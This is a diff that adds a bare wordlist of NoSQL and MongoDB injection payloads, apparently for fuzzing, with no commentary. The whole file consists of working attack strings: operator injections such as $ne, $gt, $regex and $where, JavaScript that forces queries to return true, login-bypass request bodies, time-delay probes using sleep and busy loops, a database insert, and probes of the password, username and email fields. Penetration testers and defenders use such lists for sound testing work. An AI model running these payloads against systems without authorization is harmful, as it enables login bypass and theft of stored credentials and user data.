@@ -1,0 +1,658 @@
+' && ''=='
+' && ''==''//
+' && ''=='';
+' && ''=='';'
+' && ''=='';+
+' && 1 && '
+' || ''==''
+' || ''==''//
+' || ''=='';
+' || ''=='';'
+' || ''=='';+
+' || 1 || '
+' } ], $comment:'injected'
+" }, { $comment:'injected'
+"], $comment:'injected'
+", $comment:'injected'
+', $comment:'injected'
+", $where:'1==1'
+"}, $where:'1==1'
+"}, $ne:null
+{"$eq": ""}
+{"$eq": 0}
+{"$eq": -1}
+{"$eq": 1}
+{"$eq": "a"}
+{"$eq": null}
+{"$exists": ""}
+{"$exists": 0}
+{"$exists": -1}
+{"$exists": 1}
+{"$exists": "a"}
+{"$exists": null}
+{"$gt": ""}
+{$gt: ''}
+{"$gt": 0}
+{"$gt": -1}
+{"$gt": 1}
+{"$gt": "a"}
+{"$gte": ""}
+{"$gte": 0}
+{"$gte": -1}
+{"$gte": 1}
+{"$gte": "a"}
+{"$gte": null}
+{"$gt": null}
+{"$in": ""}
+{"$in": 0}
+{"$in": -1}
+{"$in": 1}
+{"$in": "a"}
+{"$in": null}
+{"$lt": ""}
+{"$lt": 0}
+{"$lt": -1}
+{"$lt": 1}
+{"$lt": "a"}
+{"$lte": ""}
+{"$lte": 0}
+{"$lte": -1}
+{"$lte": 1}
+{"$lte": "a"}
+{"$lte": null}
+{"$lt": null}
+{"$ne": ""}
+{"$ne": 0}
+[$ne]=1
+[$ne]=sdfsffd
+[$gt]=1
+[$gt]=a
+[$lt]=1
+[$lt]=a
+[$gte]=1
+[$gte]=a
+[$lte]=1
+[$lte]=a
+[$in]=1
+[$in]=0
+[$in]=-1
+[$in]=
+[$in]=.*
+[$in]=admin
+[$nin]=1
+[$nin]=0
+[$nin]=-1
+[$nin]=
+[$nin]=.*
+[$nin]=admin
+[$regex]=0
+[$regex]=
+[$regex]=.*
+[$regex]=admin
+{ $ne: 1 }
+{"$ne": -1}
+{"$ne": 1}
+{"$ne": "a"}
+{"$ne": null}
+{"$nin": ""}
+{$nin: [""]}
+{"$nin": 0}
+{"$nin": -1}
+{"$nin": 1}
+{"$nin": "a"}
+{"$nin": null}
+', $or: [ {}, { 'a':'a
+{"$regex": ""}
+{"$regex": 0}
+{"$regex": -1}
+{"$regex": 1}
+{"$regex": "a"}
+{"$regex": null}
+{"$regex": ".*"}
+', $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'//
+', $where: '1 == 1'%00
+, $where: '1 == 1'//
+, $where: '1 == 1'%00
+$where: '1 == 1'//
+$where: '1 == 1'%00
+', $where: '1 == 1';
+', $where: '1 == 1';+
+, $where: '1 == 1';
+, $where: '1 == 1';+
+$where: '1 == 1';
+$where: '1 == 1';+
+{"$ne":null}, "$where": "1"
+{"$ne":null}, "$where": "0"
+{"$ne":null}, "$where": true
+{"$ne":null}, "$where": null
+{"$ne":null}, "$where": "undefined"
+{"$ne":null}, "$where": "true"
+{"$gt":""}, "$where": "1"
+{"$gt":""}, "$where": "0"
+{"$gt":""}, "$where": true
+{"$gt":""}, "$where": null
+{"$gt":""}, "$where": "undefined"
+{"$gt":""}, "$where": "true"
+{"$lt":""}, "$where": "1"
+{"$lt":""}, "$where": "0"
+{"$lt":""}, "$where": true
+{"$lt":""}, "$where": null
+{"$lt":""}, "$where": "undefined"
+{"$lt":""}, "$where": "true"
+{"$gte":0}, "$where": "1"
+{"$gte":0}, "$where": "0"
+{"$gte":0}, "$where": true
+{"$gte":0}, "$where": null
+{"$gte":0}, "$where": "undefined"
+{"$gte":0}, "$where": "true"
+{"$eq":true}, "$where": "1"
+{"$eq":true}, "$where": "0"
+{"$eq":true}, "$where": true
+{"$eq":true}, "$where": null
+{"$eq":true}, "$where": "undefined"
+{"$eq":true}, "$where": "true"
+{"$regex":".*"}, "$where": "1"
+{"$regex":".*"}, "$where": "0"
+{"$regex":".*"}, "$where": true
+{"$regex":".*"}, "$where": null
+{"$regex":".*"}, "$where": "undefined"
+{"$regex":".*"}, "$where": "true"
+{"$exists":true}, "$where": "1"
+{"$exists":true}, "$where": "0"
+{"$exists":true}, "$where": true
+{"$exists":true}, "$where": null
+{"$exists":true}, "$where": "undefined"
+{"$exists":true}, "$where": "true"
+' && ''==''%00
+' || ''==''%00
+"'0;return true
+"'0;return true//
+"'0;return true;
+"'0;return true;'
+"'0;return true;+
+"0;return true
+"0;return true//
+"0;return true;
+"0;return true;'
+"0;return true;+
+'"0;return true
+'"0;return true//
+'"0;return true;
+'"0;return true;'
+'"0;return true;+
+'''0;return true
+'''0;return true//
+'''0;return true;
+'''0;return true;'
+'''0;return true;+
+'0;return true
+'0;return true//
+'0;return true;
+'0;return true;'
+'0;return true;+
+0;return true
+0;return true//
+0;return true;
+0;return true;'
+0;return true;+
+"'0;return true%00
+"0;return true%00
+'"0;return true%00
+'''0;return true%00
+'0;return true%00
+0;return true%00
+' ||  1==1//
+' ||  1==1////
+' ||  1==1//;
+' ||  1==1//;'
+' ||  1==1//;+
+" ||  1==1//
+" ||  1==1////
+" ||  1==1//;
+" ||  1==1//;'
+" ||  1==1//;+
+' ||  '1'=='1
+' ||  '1'=='1//
+' ||  '1'=='1;
+' ||  '1'=='1;'
+' ||  '1'=='1;+
+" ||  1==1//
+" ||  1==1////
+" ||  1==1//;
+" ||  1==1//;'
+" ||  1==1//;+
+''' ||  1==1//
+''' ||  1==1////
+''' ||  1==1//;
+''' ||  1==1//;'
+''' ||  1==1//;+
+' ||  1==1//
+' ||  1==1////
+' ||  1==1//;
+' ||  1==1//;'
+' ||  1==1//;+
+ ||  1==1
+ ||  1==1//
+ ||  1==1////
+ ||  1==1//;
+ ||  1==1//;'
+ ||  1==1//;+
+ ||  1==1;
+ ||  1==1;'
+ ||  1==1;+
+||  1==1
+||  1==1//
+||  1==1////
+||  1==1//;
+||  1==1//;'
+||  1==1//;+
+||  1==1;
+||  1==1;'
+||  1==1;+
+' ||  1==1%00
+' ||  1==1%00//
+' ||  1==1%00;
+' ||  1==1%00;'
+' ||  1==1%00;+
+' ||  1==1//%00
+" ||  1==1%00
+" ||  1==1%00//
+" ||  1==1%00;
+" ||  1==1%00;'
+" ||  1==1%00;+
+" ||  1==1//%00
+'  ||  '1'=='1%00
+" ||  1==1%00
+" ||  1==1%00//
+" ||  1==1%00;
+" ||  1==1%00;'
+" ||  1==1%00;+
+" ||  1==1//%00
+''' ||  1==1%00
+''' ||  1==1%00//
+''' ||  1==1%00;
+''' ||  1==1%00;'
+''' ||  1==1%00;+
+''' ||  1==1//%00
+' ||  1==1%00
+' ||  1==1%00//
+' ||  1==1%00;
+' ||  1==1%00;'
+' ||  1==1%00;+
+' ||  1==1//%00
+ ||  1==1%00
+ ||  1==1%00//
+ ||  1==1%00;
+ ||  1==1%00;'
+ ||  1==1%00;+
+ ||  1==1//%00
+||  1==1%00
+||  1==1%00//
+||  1==1%00;
+||  1==1%00;'
+||  1==1%00;+
+||  1==1//%00
+' ||  1==1%00%00
+" ||  1==1%00%00
+'" ||  1==1%00%00
+''' ||  1==1%00%00
+' ||  1==1%00%00
+ ||  1==1%00%00
+||  1==1%00%00
+' || 'a'=='a
+' || 'a'=='a'//
+' || 'a'=='a'////
+' || 'a'=='a'//;
+' || 'a'=='a'//;'
+' || 'a'=='a'//;+
+' || 'a'=='a';
+' || 'a'=='a';'
+' || 'a'=='a';+
+' || 'a'=='a'%00
+' || 'a'=='a'%00//
+' || 'a'=='a'%00;
+' || 'a'=='a'%00;'
+' || 'a'=='a'%00;+
+' || 'a'=='a'//%00
+' || 'a'=='a'%00%00
+'' || 'a'=='a
+'' || 'a'=='a'//
+'' || 'a'=='a'////
+'' || 'a'=='a'//;
+'' || 'a'=='a'//;'
+'' || 'a'=='a'//;+
+'' || 'a'=='a';
+'' || 'a'=='a';'
+'' || 'a'=='a';+
+'' || 'a'=='a'%00
+'' || 'a'=='a'%00//
+'' || 'a'=='a'%00;
+'' || 'a'=='a'%00;'
+'' || 'a'=='a'%00;+
+'' || 'a'=='a'//%00
+'' || 'a'=='a'%00%00
+"' || 'a'=='a
+"' || 'a'=='a'//
+"' || 'a'=='a'////
+"' || 'a'=='a'//;
+"' || 'a'=='a'//;'
+"' || 'a'=='a'//;+
+"' || 'a'=='a';
+"' || 'a'=='a';'
+"' || 'a'=='a';+
+"' || 'a'=='a'%00
+"' || 'a'=='a'%00//
+"' || 'a'=='a'%00;
+"' || 'a'=='a'%00;'
+"' || 'a'=='a'%00;+
+"' || 'a'=='a'//%00
+"' || 'a'=='a'%00%00
+'"' || 'a'=='a
+'"' || 'a'=='a'//
+'"' || 'a'=='a'////
+'"' || 'a'=='a'//;
+'"' || 'a'=='a'//;'
+'"' || 'a'=='a'//;+
+'"' || 'a'=='a';
+'"' || 'a'=='a';'
+'"' || 'a'=='a';+
+'"' || 'a'=='a'%00
+'"' || 'a'=='a'%00//
+'"' || 'a'=='a'%00;
+'"' || 'a'=='a'%00;'
+'"' || 'a'=='a'%00;+
+'"' || 'a'=='a'//%00
+'"' || 'a'=='a'%00%00
+"'' || 'a'=='a
+"'' || 'a'=='a'//
+"'' || 'a'=='a'////
+"'' || 'a'=='a'//;
+"'' || 'a'=='a'//;'
+"'' || 'a'=='a'//;+
+"'' || 'a'=='a';
+"'' || 'a'=='a';'
+"'' || 'a'=='a';+
+"'' || 'a'=='a'%00
+"'' || 'a'=='a'%00//
+"'' || 'a'=='a'%00;
+"'' || 'a'=='a'%00;'
+"'' || 'a'=='a'%00;+
+"'' || 'a'=='a'//%00
+"'' || 'a'=='a'%00%00
+'''' || 'a'=='a
+'''' || 'a'=='a'//
+'''' || 'a'=='a'////
+'''' || 'a'=='a'//;
+'''' || 'a'=='a'//;'
+'''' || 'a'=='a'//;+
+'''' || 'a'=='a';
+'''' || 'a'=='a';'
+'''' || 'a'=='a';+
+'''' || 'a'=='a'%00
+'''' || 'a'=='a'%00//
+'''' || 'a'=='a'%00;
+'''' || 'a'=='a'%00;'
+'''' || 'a'=='a'%00;+
+'''' || 'a'=='a'//%00
+'''' || 'a'=='a'%00%00
+" || "a"=="a
+" || "a"=="a"//
+" || "a"=="a"////
+" || "a"=="a"//;
+" || "a"=="a"//;'
+" || "a"=="a"//;+
+" || "a"=="a";
+" || "a"=="a";'
+" || "a"=="a";+
+" || "a"=="a"%00
+" || "a"=="a"%00//
+" || "a"=="a"%00;
+" || "a"=="a"%00;'
+" || "a"=="a"%00;+
+" || "a"=="a"//%00
+" || "a"=="a"%00%00
+'" || "a"=="a
+'" || "a"=="a"//
+'" || "a"=="a"////
+'" || "a"=="a"//;
+'" || "a"=="a"//;'
+'" || "a"=="a"//;+
+'" || "a"=="a";
+'" || "a"=="a";'
+'" || "a"=="a";+
+'" || "a"=="a"%00
+'" || "a"=="a"%00//
+'" || "a"=="a"%00;
+'" || "a"=="a"%00;'
+'" || "a"=="a"%00;+
+'" || "a"=="a"//%00
+'" || "a"=="a"%00%00
+"" || "a"=="a
+"" || "a"=="a"//
+"" || "a"=="a"////
+"" || "a"=="a"//;
+"" || "a"=="a"//;'
+"" || "a"=="a"//;+
+"" || "a"=="a";
+"" || "a"=="a";'
+"" || "a"=="a";+
+"" || "a"=="a"%00
+"" || "a"=="a"%00//
+"" || "a"=="a"%00;
+"" || "a"=="a"%00;'
+"" || "a"=="a"%00;+
+"" || "a"=="a"//%00
+"" || "a"=="a"%00%00
+'"" || "a"=="a
+'"" || "a"=="a"//
+'"" || "a"=="a"////
+'"" || "a"=="a"//;
+'"" || "a"=="a"//;'
+'"" || "a"=="a"//;+
+'"" || "a"=="a";
+'"" || "a"=="a";'
+'"" || "a"=="a";+
+'"" || "a"=="a"%00
+'"" || "a"=="a"%00//
+'"" || "a"=="a"%00;
+'"" || "a"=="a"%00;'
+'"" || "a"=="a"%00;+
+'"" || "a"=="a"//%00
+'"" || "a"=="a"%00%00
+"'" || "a"=="a
+"'" || "a"=="a"//
+"'" || "a"=="a"////
+"'" || "a"=="a"//;
+"'" || "a"=="a"//;'
+"'" || "a"=="a"//;+
+"'" || "a"=="a";
+"'" || "a"=="a";'
+"'" || "a"=="a";+
+"'" || "a"=="a"%00
+"'" || "a"=="a"%00//
+"'" || "a"=="a"%00;
+"'" || "a"=="a"%00;'
+"'" || "a"=="a"%00;+
+"'" || "a"=="a"//%00
+"'" || "a"=="a"%00%00
+'''" || "a"=="a
+'''" || "a"=="a"//
+'''" || "a"=="a"////
+'''" || "a"=="a"//;
+'''" || "a"=="a"//;'
+'''" || "a"=="a"//;+
+'''" || "a"=="a";
+'''" || "a"=="a";'
+'''" || "a"=="a";+
+'''" || "a"=="a"%00
+'''" || "a"=="a"%00//
+'''" || "a"=="a"%00;
+'''" || "a"=="a"%00;'
+'''" || "a"=="a"%00;+
+'''" || "a"=="a"//%00
+'''" || "a"=="a"%00%00
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() {{ emit(1,1); }});
+';it=new Date();do{pt=new Date();}while(pt-it<5000);
+"'}, { password : /.*/ }
+"'}, { password : /.*/ }//
+"'}, { password : /.*/ };
+"'}, { password : /.*/ };'
+"'}, { password : /.*/ };+
+"}, { password : /.*/ }
+"}, { password : /.*/ }//
+"}, { password : /.*/ };
+"}, { password : /.*/ };'
+"}, { password : /.*/ };+
+'"}, { password : /.*/ }
+'"}, { password : /.*/ }//
+'"}, { password : /.*/ };
+'"}, { password : /.*/ };'
+'"}, { password : /.*/ };+
+'''}, { password : /.*/ }
+'''}, { password : /.*/ }//
+'''}, { password : /.*/ };
+'''}, { password : /.*/ };'
+'''}, { password : /.*/ };+
+'}, { password : /.*/ }
+'}, { password : /.*/ }//
+'}, { password : /.*/ };
+'}, { password : /.*/ };'
+'}, { password : /.*/ };+
+}, { password : /.*/ }
+}, { password : /.*/ }//
+}, { password : /.*/ };
+}, { password : /.*/ };'
+}, { password : /.*/ };+
+"'}, { password : /.*/ }%00
+"}, { password : /.*/ }%00
+'"}, { password : /.*/ }%00
+'''}, { password : /.*/ }%00
+'}, { password : /.*/ }%00
+}, { password : /.*/ }%00
+'';return 'a'=='a' && ''=='
+'';return 'a'=='a' && ''==''//
+'';return 'a'=='a' && ''=='';
+'';return 'a'=='a' && ''=='';'
+'';return 'a'=='a' && ''=='';+
+'';return 'a'=='a' && ''==''%00
+';return 'a'=='a' && ''=='
+';return 'a'=='a' && ''==''//
+';return 'a'=='a' && ''=='';
+';return 'a'=='a' && ''=='';'
+';return 'a'=='a' && ''=='';+
+';return 'a'=='a' && ''==''%00
+"';return 'a'=='a' && ''=='
+"';return 'a'=='a' && ''==''//
+"';return 'a'=='a' && ''=='';
+"';return 'a'=='a' && ''=='';'
+"';return 'a'=='a' && ''=='';+
+"';return 'a'=='a' && ''==''%00
+'''';return 'a'=='a' && ''=='
+'''';return 'a'=='a' && ''==''//
+'''';return 'a'=='a' && ''=='';
+'''';return 'a'=='a' && ''=='';'
+'''';return 'a'=='a' && ''=='';+
+'''';return 'a'=='a' && ''==''%00
+'';return 'a'=='a' && ''=='
+'';return 'a'=='a' && ''==''//
+'';return 'a'=='a' && ''=='';
+'';return 'a'=='a' && ''=='';'
+'';return 'a'=='a' && ''=='';+
+'';return 'a'=='a' && ''==''%00
+';return 'a'=='a' && ''=='
+';return 'a'=='a' && ''==''//
+';return 'a'=='a' && ''=='';
+';return 'a'=='a' && ''=='';'
+';return 'a'=='a' && ''=='';+
+';return 'a'=='a' && ''==''%00
+"";return(true);var xyz='a
+"";return(true);var xyz='a'//
+"";return(true);var xyz='a';
+"";return(true);var xyz='a';'
+"";return(true);var xyz='a';+
+"";return(true);var xyz='a'%00
+"'";return(true);var xyz='a
+"'";return(true);var xyz='a'//
+"'";return(true);var xyz='a';
+"'";return(true);var xyz='a';'
+"'";return(true);var xyz='a';+
+"'";return(true);var xyz='a'%00
+";return(true);var xyz='a
+";return(true);var xyz='a'//
+";return(true);var xyz='a';
+";return(true);var xyz='a';'
+";return(true);var xyz='a';+
+";return(true);var xyz='a'%00
+'"";return(true);var xyz='a
+'"";return(true);var xyz='a'//
+'"";return(true);var xyz='a';
+'"";return(true);var xyz='a';'
+'"";return(true);var xyz='a';+
+'"";return(true);var xyz='a'%00
+'"`;return(true);var xyz='a
+'"`;return(true);var xyz='a'//
+'"`;return(true);var xyz='a';
+'"`;return(true);var xyz='a';'
+'"`;return(true);var xyz='a';+
+'"`;return(true);var xyz='a'%00
+'''";return(true);var xyz='a
+'''";return(true);var xyz='a'//
+'''";return(true);var xyz='a';
+'''";return(true);var xyz='a';'
+'''";return(true);var xyz='a';+
+'''";return(true);var xyz='a'%00
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+';sleep(5000);//'
+';sleep(5000);//''
+';sleep(5000);%00
+';sleep(5000);//%00
+';sleep(5000);+%00
+' && this.email.indexOf('a')!=-1//
+' && this.email.indexOf('a')!=-1//+%00
+' && this.email.match(/.*/)//
+' && this.email.match(/.*/)//+%00
+' && this.email!=null//
+' && this.email!=null//+%00
+' && this.login.indexOf('a')!=-1//
+' && this.login.indexOf('a')!=-1//+%00
+' && this.login.match(/.*/)//
+' && this.login.match(/.*/)//+%00
+' && this.login!=null//
+' && this.login!=null//+%00
+' && this.name.indexOf('a')!=-1//
+' && this.name.indexOf('a')!=-1//+%00
+' && this.name.match(/.*/)//
+' && this.name.match(/.*/)//+%00
+' && this.name!=null//
+' && this.name!=null//+%00
+' && this.password.indexOf('a')!=-1//
+' && this.password.indexOf('a')!=-1//+%00
+' && this.password.match(/.*/)//
+' && this.password.match(/.*/)////
+' && this.password.match(/.*/)//;
+' && this.password.match(/.*/)//;'
+' && this.password.match(/.*/)//;+
+' && this.password.match(/.*/)//%00
+' && this.password.match(/.*/)//+%00
+' && this.password!=null//
+' && this.password!=null//+%00
+' && this.username.indexOf('a')!=-1//
+' && this.username.indexOf('a')!=-1//+%00
+' && this.username.match(/.*/)//
+' && this.username.match(/.*/)//+%00
+' && this.username!=null//
+' && this.username!=null//+%00
+true, $where: '1 == 1'
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+1, $where: '1 == 1'
